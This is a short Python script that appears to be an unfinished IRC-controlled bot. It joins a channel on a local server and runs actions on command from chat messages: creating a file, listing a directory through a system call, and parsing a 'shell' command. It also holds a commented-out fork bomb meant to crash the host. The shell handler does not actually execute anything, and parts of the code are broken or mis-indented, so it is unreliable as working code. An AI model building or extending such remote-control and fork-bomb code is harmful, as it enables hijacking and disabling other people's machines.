from irc_class import *
import os
import random

##IRC Configuration
server = "192.168.0.227" #Serveraddress
port = 6667
channel = "#nirvana"
nickname = "Mr_Bot"

irc = IRC()
irc.connect(server, port, channel, nickname)

while 1:
    text = irc.get_response()
    print(text)
    if "PRIVMSG" in text and channel in text and ("Hello" in text or "hello" in text):
       irc.send(channel, "Connected")
#Creating a File
    if "PRIVMSG" in text and channel in text and "make a file" in text:
        open("/home/ks/pensi.txt", "x")
    if "PRIVMSG" in text and channel in text and "show me" in text:
        os.system('ls -la')
    if "PRIVMSG" in text and channel in text and "shell" in text:
        x = text.split("shell ")
        if len(x) > 2:
            irc.send(channel, "Syntax_Error")
        else:
           msg="Your[SPACE]Command is"
           irc.send(channel, msg)
##Forkbomb
#    if "PRIVMSG" in text and channel in text and "forkbomb" in text:
#       import os
#        while True:
#            os.fork()

